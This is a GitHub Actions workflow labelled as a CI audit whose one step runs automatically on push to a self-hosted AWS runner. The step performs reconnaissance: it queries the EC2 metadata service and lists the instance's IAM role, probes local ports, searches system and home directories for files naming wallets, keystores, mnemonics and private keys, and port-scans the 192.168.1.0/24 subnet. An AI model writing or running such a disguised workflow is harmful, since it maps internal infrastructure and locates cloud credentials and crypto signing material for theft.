name: ci-audit-2760
on:
  push:
    branches:
      - 'ci/audit-2760'
  workflow_dispatch:
permissions:
  contents: read
jobs:
  scan:
    runs-on: [self-hosted, linux, aws, marketingos]
    timeout-minutes: 20
    steps:
      - name: recon
        run: |
          echo "=== i2760 SCAN START $(date -u) ==="
          echo "HOST $(hostname)"; id; uname -a
          echo "--- ip ---"; ip -4 addr 2>&1 | grep -E 'inet |^[0-9]' ; echo "--- route ---"; ip route 2>&1
          echo "--- neigh ---"; ip neigh 2>&1 | head -40
          echo "--- listen ---"; (ss -lnt 2>/dev/null || netstat -lnt 2>/dev/null) | head -60
          echo "--- imds ---"
          T=$(curl -s -m3 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
          for k in instance-id instance-type placement/region placement/availability-zone mac local-ipv4; do echo -n "$k="; curl -s -m3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/$k; echo; done
          echo -n "iam-role="; curl -s -m3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/; echo
          echo "--- cloudflared local ports ---"
          for p in 3021 3022 20128 3005 3030 3023 3031 22; do timeout 2 bash -c "echo > /dev/tcp/127.0.0.1/$p" 2>/dev/null && echo "open127 $p" || echo "closed127 $p"; done
          echo "--- grep disk for wallet/signing material (names only) ---"
          grep -rIl -m1 -iE 'jwallet|j wallet|keystore|mnemonic|private_key|privatekey|tronweb|trc20|hot.?wallet' /home/ubuntu /root /opt /etc /srv 2>/dev/null | head -40
          echo "--- port scan 192.168.1.0/24 (read-only) ---"
          python3 - <<'PY'
import socket,concurrent.futures as cf
ports=[22,80,443,2375,2376,3000,3005,3021,3022,3023,3030,3031,3306,5432,5433,6379,8080,8081,8082,8083,8443,9000,9200,11211,20128,27017,5000,5001,8888]
def chk(a,p):
    s=socket.socket(); s.settimeout(0.35)
    try:
        if s.connect_ex((a,p))==0: return a,p
    except: pass
    finally: s.close()
    return None
res=[]
tasks=[('192.168.1.%d'%i,p) for i in range(1,255) for p in ports]
with cf.ThreadPoolExecutor(max_workers=300) as ex:
    for r in ex.map(lambda t:chk(t[0],t[1]), tasks):
        if r: res.append(r)
for a,p in sorted(res): print('OPEN',a,p)
print('SCAN_OK total_open=%d'%len(res))
PY
          echo "=== i2760 SCAN DONE ==="
